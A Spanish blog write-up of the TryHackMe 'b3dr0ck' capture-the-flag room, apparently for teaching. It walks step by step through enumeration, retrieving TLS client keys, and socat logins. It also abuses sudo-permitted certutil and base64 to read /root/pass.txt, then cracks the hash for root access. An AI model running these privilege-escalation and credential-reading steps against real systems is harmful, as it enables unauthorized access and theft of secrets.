---
title: Try Hack Me - b3dr0ck - Writeup
date: 2022-09-08 09:30:00 +0800
categories: ["Try Hack Me"]
tags: [thm, writeups]     # TAG names should always be lowercase
---

En esta guía vamos a trabajar con la máquina [b3dr0ck](https://tryhackme.com/room/b3dr0ck) disponible en [THM](https://tryhackme.com), un sencillo CTF creado por [F11snipe](https://tryhackme.com/p/F11snipe) en el que pondremos en práctica técnicas de enumeración, escalado de privilegios y utilización de algunas herramientas online para codificación y crakeo, entre otras curiosidades.

Dentro música.

## Inicio

Para empezar, echamos un ojo a la descripción que aparece en el room:

![](/assets/posts/20220908/img_00.jpg)

Fred Flintstone & Barney Rubble!

Barney está configurando el servidor web ABC tratando de utilizar los certificados TLS para asegurar las conexiones, pero está teniendo problemas. Esto es lo que sabemos...

* Fue capaz de configurar **nginx** en el puerto **80**, redirigiendo a un servidor web TLS personalizado en el puerto **4040**.
* Hay un socket TCP escuchando con un servicio que permite recuperar los archivos de credenciales TLS (clave y certificado del cliente).
* Hay otro servicio TCP (TLS) escuchando para las conexiones autorizadas utilizando los archivos obtenidos del servicio anterior.

OK, nos dicen que tenemos un servidor escuchando en el *tcp/80* que redirige al *tcp/4040* y dos servicios en puertos a descubrir.

En términos de usuarios, podemos sospechar que estan *Fred* y *Barney*.

## Enumeración

Arrancamos con **nmap** a ver qué encontramos.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]
└─$ nmap -sC -sV -p- 10.10.40.42 -oN nmap_output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-08 16:42 CEST
Nmap scan report for 10.10.40.42
Host is up (0.036s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
|_  256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.40.42:4040/
|_http-server-header: nginx/1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Thu, 08 Sep 2022 14:46:31 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
[...]
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-09-08T14:40:55
|_Not valid after:  2023-09-08T14:40:55
| tls-alpn: 
|_  http/1.1
9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-09-08T14:40:55
|_Not valid after:  2023-09-08T14:40:55
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.92%T=SSL%I=7%D=9/8%Time=631A0048%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html
SF:\r\nDate:\x20Thu,\x2008\x20Sep\x202022\x2014:46:31\x20GMT\r\nConnection
SF::\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20\
[...]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 383.97 seconds
```

Significado de las flags:

* `-sC`&nbsp;: devuelve información sobre la versión de los servicios corriendo en los puertos abiertos.
* `-sV`&nbsp;: realiza un escaneo utilizando el conjunto de scripts por defecto de **nmap**.
* `-p-`&nbsp;: escanea los 65535 puertos.
* `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*

El volcado de **nmap** nos cuenta que tenemos cinco puertos abiertos:

* *22/tcp* con un servicio **ssh** escuchando
* *80/tcp* con un **nginx 1.18.0** escuchando
* *4040/tcp* el puerto al que redirige el anterior, con un servicio SSL escuchando
* *9009/tcp* con un servicio **pichat** corriendo (?)
* *54321/tcp* con otro servicio SSL escuchando

Cargamos la IP del room en el browser `http://10.10.40.42`. Nos redirige a `https://10.10.40.42:4040` y nos da un Warning por el certificado. Aceptamos los riesgos.

![](/assets/posts/20220908/img_01.png)

Nos carga un vista con el siguiente texto.

![](/assets/posts/20220908/img_02.png)

Todo muy bonito pero muy poco con lo que poder avanzar más allá de cierta confirmación sobre la existencia del usuario *Barney*.

Retomando lo que nos indicaban en la descripción del room sabemos que hay un socket TCP escuchando con un servicio que nos ayudará a recuperar los archivos de credenciales TLS/SSL.

> **Qué es un Socket y para qué sirve:** Cuando dos procesos que están en hosts diferentes (ordenadores, smartphones o cualquier dispositivo conectado a una red) quieren intercambiar información a través de dicha red (sea ésta local o Internet) es necesario que abran un **socket** (TCP o UDP) para establecer la comunicación e intercambiar datos. Todas las comunicaciones entre dos o más hosts se realizan a nivel de la **Capa de Transporte** (capa 4 del modelo OSI / capa 3 en el modelo TCP/IP), que es la primera capa donde hay una comunicación punto a punto entre dos o más equipos.

A partir el volcado de **nmap** los candidatos son el *9009/tcp* y el *54321/tcp*.

Probamos con el *9009/tcp*.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]
└─$ nc 10.10.40.42 9009


 __          __  _                            _                   ____   _____
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|




What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
What are you looking for?
```

Bien. En el puerto *9009/tcp* efectivamente esta corriendo el servicio que permite recuperar los archivos de credenciales TLS (clave y certificado del cliente); y en el *54321/tcp* nos confirman que esta activo el *secure login service*, el servicio que soporta las conexiones autorizadas utilizando los archivos obtenidos mediante éste. También nos indican cómo debemos conectarnos al servicio de login utilizando **socat**.

```
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
```

Probamos a obtener los archivos de credenciales.

```console
What are you looking for? cert
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA5MDgxNDQxMDhaFw0yMzA5MDgxNDQxMDhaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDxK/4/
[...]
+IDCFi9RDrG016HRQ19mqIzdgz4yfggneQpgIN424r4+ZAziusSzPTRUXlfTUjDM
M8uAgM7JYLBE75+uCnIu3n1cbcziBa4R8X4ax+cQdRmCyArsveH43KSplVUUF+Uw
Z9wlbTI=
-----END CERTIFICATE-----

What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA8Sv+P0pngoe7EWgnmV3P2hoym3sN9Tc7KSXKreOnVz6MHavo
b/hzS7lNwc6D+q/rR0KUVSiW5Y5luGUCIf3C54AnbeaI1auajXGVkXuVyaAUTaeQ
57lHDcv9bH7Ss8dL+HhCRB1tBNxGxhD+rX1goHne18vgByTAEw9LgJO0ZVtdbdHR
[...]
Vo1xDhcCgYEAyrmN49C6gn5Rx7E6RHV+D4dio/xdmt4zYK3M6SUMIMqO7DdOkcsh
ebD1SOBGilbjDmKdv8jKu/vAvLYEIs7zXsIFH/d6xqvpJFEqAVrByuXsF69ts9fl
2q4we74ej2L8zl/LHkVj7xhnxfjYQ81swNPq6KfXUMxfSjHh1U3nQ6U=
-----END RSA PRIVATE KEY-----

What are you looking for?
```

Copiamos el Certificado TLS y la Clave Privada en sendos ficheros con el nombre <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">cert.pem</code>&nbsp;&nbsp; y <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">key.pem</code>&nbsp;respectivamente. Una vez tenemos ambos ficheros creados en nuestro directorio de trabajo, y tal como nos sugieren, utilizamos **socat** para conectarnos al servicio de login disponible en el puerto *54321/tcp*.

> **Socat** es una utilidad de red basada en línea de comandos que posibilita la transferencia bidireccional de datos entre dos canales de datos independientes. Se la considera la versión avanzada de **netcat** pues si bien hacen cosas similares, **socat** cuenta con varias funciones adicionales.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]
└─$ socat stdio ssl:10.10.40.42:54321,cert=cert.pem,key=key.pem,verify=0


 __     __   _     _             _____        _     _             _____        _
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)



Welcome: 'Barney Rubble' is authorized.
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> help
Password hint: d1ad7c0[...]4180dd (user = 'Barney Rubble')
b3dr0ck>
```

OK, tenemos la contraseña del usuario *barney*. Tiramos del **ssh** que tenemos disponible en el puerto *22/tcp* para conectarnos.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]
└─$ ssh barney@10.10.40.42
The authenticity of host '10.10.40.42 (10.10.40.42)' can't be established.
ED25519 key fingerprint is SHA256:CFTFQcdE19Y7z0z2H7f+gsTTUaLOiPE1gtFt0egy/V8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.40.42' (ED25519) to the list of known hosts.
barney@10.10.40.42's password:
barney@b3dr0ck:~$ pwd
/home/barney
barney@b3dr0ck:~$ ls
barney.txt
barney@b3dr0ck:~$ cat barney.txt
THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
barney@b3dr0ck:~$
```

Tenemos la primer flag correspondiente al usuario *barney*. Seguimos.

```console
barney@b3dr0ck:~$ cd ..
barney@b3dr0ck:/home$ ls
barney  fred
barney@b3dr0ck:/home$ cd fred
barney@b3dr0ck:/home/fred$ ls
fred.txt
barney@b3dr0ck:/home/fred$ cat fred.txt
cat: fred.txt: Permission denied
barney@b3dr0ck:/home/fred$
```

Necesitamos hacer un escalado de privilegios horizonal.

## Escalado de privilegios horizonal

Veamos qué binarios puede ejecutar *barney* con privilegios de root.

```console
barney@b3dr0ck:/home/fred$ cd ..
barney@b3dr0ck:/home$ sudo -l
[sudo] password for barney:
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
barney@b3dr0ck:/home$
```

Tenemos disponible el binario **certutil**.

> **certutil** es una utilidad de línea de comandos que puede crear y modificar bases de datos de certificados y claves. En concreto, puede enumerar, generar, modificar o eliminar certificados, crear o cambiar la contraseña, generar nuevos pares de claves públicas y privadas, mostrar el contenido de la base de datos de claves o eliminar pares de claves dentro de la base de datos de claves. [fuente](https://www.systutorials.com/docs/linux/man/1-certutil/)

Estupendo. Vamos con ello.

```console
barney@b3dr0ck:/home$ sudo certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]
```

Según lo anterior, podemos listar y generar certificados.

```console
barney@b3dr0ck:/home$ sudo certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30 21:54 .
drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
-rw-r----- 1 root root  972 Sep  8 14:41 barney.certificate.pem
-rw-r----- 1 root root 1678 Sep  8 14:41 barney.clientKey.pem
-rw-r----- 1 root root  894 Sep  8 14:41 barney.csr.pem
-rw-r----- 1 root root 1678 Sep  8 14:41 barney.serviceKey.pem
-rw-r----- 1 root root  976 Sep  8 14:41 fred.certificate.pem
-rw-r----- 1 root root 1678 Sep  8 14:41 fred.clientKey.pem
-rw-r----- 1 root root  898 Sep  8 14:41 fred.csr.pem
-rw-r----- 1 root root 1678 Sep  8 14:41 fred.serviceKey.pem

barney@b3dr0ck:/home$
```

Bien. Según el listado anterior tenemos acceso al certificado y la clave del usuario *fred*. Vamos a hacernos con ello.

```console
barney@b3dr0ck:/home$ sudo certutil cat /usr/share/abc/certs/fred.certificate.pem
Generating credentials for user: cat (usrshareabccertsfredcertificatepem)
Generated: clientKey for cat: /usr/share/abc/certs/cat.clientKey.pem
Generated: certificate for cat: /usr/share/abc/certs/cat.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAuL8GCdbmIn6vOA6HG6lk6kh/ONUQstPekZtleyGC4MLQM7Jy
dL2xnf/3OiG3I8Mpg7SCr7Q7lnZjCXx0vedjFHk+15WYaP4H2Fs5VtJ75w0pfu+9
F/b8PIZpxligz5uWDRKaCogQR9n8wGSgFnd6Sav9G83a6FrBRt4XtxgdbnDy2/DZ
[...]
PrcccQKBgH9PfBEuZ6f3zibRkFbqbc/KzV1vOtqsVUVfVIW8Lspiou0eg34aQ0fO
oFqGU2ikKsrL7eAYHBpdrYuqH950xgkwXJZJT/OP6Zt4yDDNGTHXJtJ3RjLhygqm
fcBaHqct5fauNjmCK7eu/wG4esPi7C2oygFcTWqtcqAxH+vwoWvh
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICtjCCAZ4CAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA5MDgxNTI2MThaFw0yMjA5MDkxNTI2MThaMC0xKzApBgNVBAMMInVz
cnNoYXJlYWJjY2VydHNmcmVkY2VydGlmaWNhdGVwZW0wggEiMA0GCSqGSIb3DQEB
[...]
J6dVlXfg2PaJABcXUQsU35a5Ne+SF9e5FliPAYG4750sfLB8VGVfZ9JBvyGJ2zLJ
kyRczMI9Z+8lQO/rt6WmwYIBNhChGhkv0+5xNQt1aIxV2xhz27oGBS32GqKGYMek
sDYWHwJVvLHGPEMoaeQ4+mFlIHlsaE6p6g8=
-----END CERTIFICATE-----
barney@b3dr0ck:/home$
```

Como hemos hecho con el usuario *barney*, copiamos la clave y el certificado de *fred* y creamos con ellos los ficheros <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">fred.key.pem</code>&nbsp;&nbsp; y <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">fred.cert.pem</code>&nbsp;respectivamente.

Volvemos a tirar de **socat** y el servicio de login corriendo en el puerto *54321/tcp* para hacernos con la contraseña de *fred*.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]
└─$ socat stdio ssl:10.10.40.42:54321,cert=fred.cert.pem,key=fred.key.pem,verify=0


 __     __   _     _             _____        _     _             _____        _
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)



Welcome: 'usrshareabccertsfredcertificatepem' is authorized.
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> help
Password hint: Yab[...]00! (user = 'usrshareabccertsfredcertificatepem')
b3dr0ck>
```

Conectamos por **ssh**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]
└─$ ssh fred@10.10.40.42
fred@10.10.40.42's password:
fred@b3dr0ck:~$ ls
fred.txt
fred@b3dr0ck:~$ cat fred.txt
THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
fred@b3dr0ck:~$
```

Obtenemos la flag correspondiente al usuario *fred*. Como ya hemos hecho con *barney*, buscamos los binarios disponibles para este segundo usuario.


```console
fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
fred@b3dr0ck:~$
```

Bien. Según ésto, *fred* puede ejecutar sin que nos solicite contraseña los binarios `/usr/bin/base32`&nbsp; y `/usr/bin/base64`&nbsp; sobre el fichero <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">pass.txt</code>&nbsp; ubicado en el directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/root</code>&nbsp;.

Vamos a ello.

## Escalado de privilegios vertical

Aprovechando lo anterior, codificamos y decodificamos el contenido del fichero para hacernos con su contenido:

```console
fred@b3dr0ck:~$
fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 --decode
LFKEC52ZKRC[...]CWNBGXURTLJZKFSSYK
fred@b3dr0ck:~$
```

OK. Con la operación anterior hemos obtenido una cadena que no sabemos muy bien qué es. Tiramos del servicio online [Cyberchef](https://cyberchef.org) para que nos eche una mano.

Para ello, copiamos la cadena que hemos obtenido en el campo **Input**.

Automaticamente se nos completa el campo **Output** y se nos habilita la opción de la *varita mágica*

![](/assets/posts/20220908/img_03.png)

Si nos posicionamos con el ratón sobre el ícono de la varita, **Cyberchef** nos cuenta lo siguiente:

![](/assets/posts/20220908/img_04.png)

Según **Cyberchef**, la cadena que tenemos ha sido codificada varias veces. Le damos a la varita.

![](/assets/posts/20220908/img_05.png)

OK, ahora tenemos un hash que podemos crakear utilizando otra herramienta online, en este caso, [Crackstation](https://crackstation.net/). Vamos a ello.

![](/assets/posts/20220908/img_06.png)

Si todo ha ido bien, nos hemos hecho con la contraseña del usuario *root*.

Volvemos al terminal que tenemos abierto con la sesión del usuario *fred*.

```console
fred@b3dr0ck:~$
fred@b3dr0ck:~$ su
Password:
root@b3dr0ck:/home/fred# cd /root
root@b3dr0ck:~# ls
pass.txt  root.txt  snap
root@b3dr0ck:~# cat root.txt
THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
root@b3dr0ck:~#
```

Misión cumplida.

Espero que os haya servido de ayuda.

Saludos he intentar ser felices.